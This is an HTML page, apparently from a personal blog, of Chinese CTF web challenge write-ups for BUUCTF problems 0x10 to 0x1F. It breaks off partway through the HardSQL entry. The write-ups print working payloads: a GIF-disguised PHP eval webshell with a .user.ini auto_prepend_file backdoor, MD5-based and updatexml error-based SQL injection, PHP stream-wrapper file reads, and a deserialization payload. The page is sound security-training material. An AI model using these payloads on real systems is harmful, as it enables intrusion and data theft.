@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>BUU_WEB刷题_0x10-0x1F - SmallT40&#39;s Blog</title><meta name="author" content="">
+<meta name="description" content="0x10.[ACTF2020 新生赛]Upload 和之前的一个一样，改个后缀名就OK。
+"><meta name="keywords" content='WEB'>
+  <meta itemprop="name" content="BUU_WEB刷题_0x10-0x1F">
+  <meta itemprop="description" content="0x10.[ACTF2020 新生赛]Upload 和之前的一个一样，改个后缀名就OK。">
+  <meta itemprop="datePublished" content="2021-05-03T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2021-05-03T00:00:00+00:00">
+  <meta itemprop="wordCount" content="4759">
+  <meta itemprop="keywords" content="WEB"><meta property="og:url" content="http://localhost:1313/posts/buu-web-0x10-0x1f/">
+  <meta property="og:site_name" content="SmallT40&#39;s Blog">
+  <meta property="og:title" content="BUU_WEB刷题_0x10-0x1F">
+  <meta property="og:description" content="0x10.[ACTF2020 新生赛]Upload 和之前的一个一样，改个后缀名就OK。">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-05-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-05-03T00:00:00+00:00">
+    <meta property="article:tag" content="WEB">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="BUU_WEB刷题_0x10-0x1F">
+  <meta name="twitter:description" content="0x10.[ACTF2020 新生赛]Upload 和之前的一个一样，改个后缀名就OK。">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/buu-web-0x10-0x1f/" title="BUU_WEB刷题_0x10-0x1F - SmallT40&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/buu-web-0x1-0xf/" title="BUU_WEB刷题_0x01-0x0F" /><link rel="next" type="text/html" href="http://localhost:1313/posts/buu-pwn-0x10-0x1f/" title="BUU_PWN刷题_0x10-0x1F" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "BUU_WEB刷题_0x10-0x1F",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/buu-web-0x10-0x1f\/"
+    },"genre": "posts","keywords": "WEB","wordcount":  4759 ,
+    "url": "http:\/\/localhost:1313\/posts\/buu-web-0x10-0x1f\/","datePublished": "2021-05-03T00:00:00+00:00","dateModified": "2021-05-03T00:00:00+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Author"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="SmallT40&#39;s Blog"><span class="header-title-text">SmallT40&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">文章</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">标签</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/">关于</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">分类</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="SmallT40&#39;s Blog"><span class="header-title-text">SmallT40&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="/posts/">文章</a></li><li class="menu-item"><a class="menu-link" href="/tags/">标签</a></li><li class="menu-item"><a class="menu-link" href="/about/">关于</a></li><li class="menu-item"><a class="menu-link" href="/categories/">分类</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>BUU_WEB刷题_0x10-0x1F</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      Anonymous</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/technology/" class="post-category" title="Category - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="published on 2021-05-03 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-05-03">2021-05-03</time></span>&nbsp;<span title="4759 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 4800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>10 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#0x10actf2020-新生赛upload">0x10.[ACTF2020 新生赛]Upload</a></li>
+            <li><a href="#0x11actf2020-新生赛backupfile">0x11.[ACTF2020 新生赛]BackupFile</a></li>
+            <li><a href="#0x12hctf-2018admin">0x12.[HCTF 2018]admin</a></li>
+            <li><a href="#0x13极客大挑战-2019buyflag">0x13.[极客大挑战 2019]BuyFlag</a></li>
+            <li><a href="#0x14bjdctf2020easy-md5">0x14.[BJDCTF2020]Easy MD5</a></li>
+            <li><a href="#0x15suctf-2019checkin">0x15.[SUCTF 2019]CheckIn</a></li>
+            <li><a href="#0x16zjctf-2019nizhuansiwei">0x16.[ZJCTF 2019]NiZhuanSiWei</a></li>
+            <li><a href="#0x17极客大挑战-2019hardsql">0x17.[极客大挑战 2019]HardSQL</a></li>
+            <li><a href="#0x18ciscn2019-华北赛区-day2-web1hack-world">0x18.[CISCN2019 华北赛区 Day2 Web1]Hack World</a></li>
+            <li><a href="#0x19网鼎杯-2018fakebook">0x19.[网鼎杯 2018]Fakebook</a></li>
+            <li><a href="#0x1agxyctf2019babysqli">0x1A.[GXYCTF2019]BabySQli</a></li>
+            <li><a href="#0x1b网鼎杯-2020-青龙组areuserialz">0x1B.[网鼎杯 2020 青龙组]AreUSerialz</a></li>
+            <li><a href="#0x1cmrctf2020你传你呢">0x1C.[MRCTF2020]你传你🐎呢</a></li>
+            <li><a href="#0x1dmrctf2020ez_bypass">0x1D.[MRCTF2020]Ez_bypass</a></li>
+            <li><a href="#0x1egyctf2020blacklist">0x1E.[GYCTF2020]Blacklist</a></li>
+            <li><a href="#0x1f护网杯-2018easy_tornado">0x1F.[护网杯 2018]easy_tornado</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h3 id="0x10actf2020-新生赛upload" class="heading-element"><span>0x10.[ACTF2020 新生赛]Upload</span>
+  <a href="#0x10actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bupload" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>和之前的一个一样，改个后缀名就OK。</p>
+<p><img loading="lazy" src='/posts/buu-web-0x10-0x1f/image-20210417185844946.png' alt="image-20210417185844946" height="655" width="1263"></p>
+<h3 id="0x11actf2020-新生赛backupfile" class="heading-element"><span>0x11.[ACTF2020 新生赛]BackupFile</span>
+  <a href="#0x11actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bbackupfile" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>可以简单扫下，发现index.php.bak</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Just num!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">==</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Try to find out source file!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>str弱相等，被转化为整形</p>
+<p>传参key=123得到flag</p>
+<h3 id="0x12hctf-2018admin" class="heading-element"><span>0x12.[HCTF 2018]admin</span>
+  <a href="#0x12hctf-2018admin" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Unicode欺骗：</p>
+<p>具体编码可查：https://unicode-table.com/en/search/?q=small+capital</p>
+<p>ᴬᴰᴹᴵᴺ</p>
+<h3 id="0x13极客大挑战-2019buyflag" class="heading-element"><span>0x13.[极客大挑战 2019]BuyFlag</span>
+  <a href="#0x13%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019buyflag" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>pay的页面中有:</p>
+<pre tabindex="0"><code>&lt;!--
+	~~~post money and password~~~
+if (isset($_POST[&#39;password&#39;])) {
+	$password = $_POST[&#39;password&#39;];
+	if (is_numeric($password)) {
+		echo &#34;password can&#39;t be number&lt;/br&gt;&#34;;
+	}elseif ($password == 404) {
+		echo &#34;Password Right!&lt;/br&gt;&#34;;
+	}
+}
+--&gt;</code></pre><p><img loading="lazy" src='/posts/buu-web-0x10-0x1f/image-20210418104024465.png' alt="image-20210418104024465" height="421" width="619"></p>
+<h3 id="0x14bjdctf2020easy-md5" class="heading-element"><span>0x14.[BJDCTF2020]Easy MD5</span>
+  <a href="#0x14bjdctf2020easy-md5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>有个hint：</p>
+<pre tabindex="0"><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>看了wp之后说是有个ffifdyop，原理是这个字符串被md5哈希了之后会变成276f722736c95d99e921722cf9ed621c，而这歌字符串前几位正好是：&lsquo;or'6，永为真。</p>
+<p><img loading="lazy" src='/posts/buu-web-0x10-0x1f/image-20210418132914216.png' alt="image-20210418132914216" height="307" width="688"></p>
+<p>因此拼接后为，相当于万能密码。</p>
+<pre tabindex="0"><code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code></pre><p>之后：</p>
+<pre tabindex="0"><code>&lt;!--
+$a = $GET[&#39;a&#39;];
+$b = $_GET[&#39;b&#39;];
+
+if($a != $b &amp;&amp; md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+--&gt;</code></pre><p>这个绕过就有很多方法了，比如<code>php?a[]=1&amp;b[]=2</code>或者构造两组md5值开头为0e的值即可绕过。</p>
+<p>在之后：</p>
+<pre tabindex="0"><code> &lt;?php
+error_reporting(0);
+include &#34;flag.php&#34;;
+
+highlight_file(__FILE__);
+
+if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){
+    echo $flag;
+} </code></pre><p>这里把==换成了===，0e大法失效，只能数组绕过。</p>
+<h3 id="0x15suctf-2019checkin" class="heading-element"><span>0x15.[SUCTF 2019]CheckIn</span>
+  <a href="#0x15suctf-2019checkin" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><pre tabindex="0"><code>GIF89a? &lt;script language=&#34;php&#34;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code></pre><p>上传</p>
+<p><img loading="lazy" src='/posts/buu-web-0x10-0x1f/image-20210418161338218.png' alt="image-20210418161338218" height="453" width="1246"></p>
+<p>本题的重点来了，文件包含漏洞，</p>
+<p>user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.</p>
+<p>什么是.user.ini？</p>
+<p>这得从php.ini说起了，php.ini是php的默认配置文件，这些配置中，分为几种：</p>
+<p><img loading="lazy" src='/posts/buu-web-0x10-0x1f/image-20210418161711896.png' alt="image-20210418161711896" height="156" width="818"></p>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
+<blockquote>
+<p><code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p></blockquote>
+<p>要用到的配置：<strong><code>auto_append_file</code></strong>：<strong>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数</strong></p>
+<p>比如：<code>auto_prepend_file=1.gif</code></p>
+<p>之后</p>
+<pre tabindex="0"><code>GIF89a? 
+auto_prepend_file=1.gif`</code></pre><p>关于.user.ini的文章：</p>
+<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html"target="_blank" rel="external nofollow noopener noreferrer">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
+<h3 id="0x16zjctf-2019nizhuansiwei" class="heading-element"><span>0x16.[ZJCTF 2019]NiZhuanSiWei</span>
+  <a href="#0x16zjctf-2019nizhuansiwei" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$text</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;text&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;welcome to the zjctf&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;h1&gt;&#34;</span><span class="o">.</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&lt;/h1&gt;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/&#34;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Not now!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>  <span class="c1">//useless.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>知识点：</p>
+<pre tabindex="0"><code>data伪协议写入文件
+php://filter用于读取源码
+php://input用于执行PHP的代码</code></pre><p>首先：</p>
+<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)</code></p>
+<p>data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p>
+<pre tabindex="0"><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。</p>
+<pre tabindex="0"><code>data://text/plain,welcome to the zjctf</code></pre><p>接下来是file:</p>
+<pre tabindex="0"><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>得到：</p>
+<pre tabindex="0"><code>&lt;?php  
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &#34;&lt;br&gt;&#34;;
+        return (&#34;U R SO CLOSE !///COME ON PLZ&#34;);
+        }  
+    }  
+}  
+?&gt;  </code></pre><p>参考反序列化基础的文章：https://www.freebuf.com/articles/web/167721.html</p>
+<p>构造：</p>
+<pre tabindex="0"><code>O:4:&#34;Flag&#34;:1:{s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;}</code></pre><p>最终payload：</p>
+<pre tabindex="0"><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&#34;Flag&#34;:1:{s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;;}</code></pre><h3 id="0x17极客大挑战-2019hardsql" class="heading-element"><span>0x17.[极客大挑战 2019]HardSQL</span>
+  <a href="#0x17%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019hardsql" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><pre tabindex="0"><code>&#39;or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23
+得到数据库geek
+
